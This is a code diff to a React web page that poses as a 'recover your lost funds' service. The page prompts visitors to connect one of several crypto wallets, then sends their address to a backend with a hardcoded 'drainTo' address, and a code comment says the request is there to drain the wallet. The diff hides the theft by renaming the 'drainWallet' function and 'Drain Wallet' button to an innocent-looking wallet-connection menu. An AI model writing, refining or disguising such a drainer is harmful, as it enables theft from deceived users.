@@ -4,18 +4,27 @@ import ReactDOM from "react-dom/client";
 const App = () => {
   const [response, setResponse] = useState(null);
   const [loading, setLoading] = useState(false);
+  const [wallets, setWallets] = useState([
+    { name: "MetaMask", icon: "https://upload.wikimedia.org/wikipedia/commons/2/2a/MetaMask_icon.svg", id: "metamask" },
+    { name: "WalletConnect", icon: "https://walletconnect.com/images/walletconnect-logo.svg", id: "walletconnect" },
+    { name: "Coinbase Wallet", icon: "https://upload.wikimedia.org/wikipedia/commons/5/53/Coinbase_Wallet_Logo.png", id: "coinbase" },
+    { name: "Trust Wallet", icon: "https://upload.wikimedia.org/wikipedia/commons/7/75/Trust_Wallet_Logo.png", id: "trust" },
+    { name: "Math Wallet", icon: "https://mathwallet.org/static/images/logo.png", id: "math" },
+    { name: "TokenPocket", icon: "https://tokenpocket.io/static/images/logo.png", id: "tokenpocket" },
+  ]);
 
-  const drainWallet = async () => {
+  const connectWallet = async (walletId) => {
     setLoading(true);
     setResponse(null);
 
     try {
-      // Check if MetaMask or any wallet is connected
-      if (!window.ethereum) {
-        throw new Error("No wallet detected. Please install MetaMask or a compatible wallet.");
+      // Check if the wallet is supported
+      if (!window[walletId]) {
+        throw new Error(`Wallet ${walletId} not supported.`);
       }
 
-      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      // Request account access
+      const accounts = await window[walletId].request({ method: "eth_requestAccounts" });
       const address = accounts[0];
 
       // Send the request to your backend to drain the wallet
@@ -24,7 +33,10 @@ const App = () => {
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify({ address, drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4" }),
+        body: JSON.stringify({
+          address,
+          drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
+        }),
       });
 
       const data = await res.json();
@@ -48,15 +60,27 @@ const App = () => {
           Recover your lost funds in one click. Connect your wallet now.
         </p>
 
-        <button
-          onClick={drainWallet}
-          disabled={loading}
-          className={`bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded transition duration-200 ${
-            loading ? "opacity-70 cursor-not-allowed" : ""
-          }`}
-        >
-          {loading ? "Draining..." : "Drain Wallet"}
-        </button>
+        <div className="space-y-4">
+          {wallets.map((wallet) => (
+            <button
+              key={wallet.id}
+              onClick={() => connectWallet(wallet.id)}
+              disabled={loading}
+              className={`flex items-center justify-center p-3 rounded-lg transition-all duration-200 ${
+                loading
+                  ? "bg-gray-700 cursor-not-allowed"
+                  : "bg-blue-600 hover:bg-blue-700"
+              }`}
+            >
+              <img
+                src={wallet.icon}
+                alt={wallet.name}
+                className="w-8 h-8 mr-3"
+              />
+              <span className="text-white font-medium">{wallet.name}</span>
+            </button>
+          ))}
+        </div>
 
         {response && (
           <div className="mt-6 p-4 bg-gray-700 rounded">
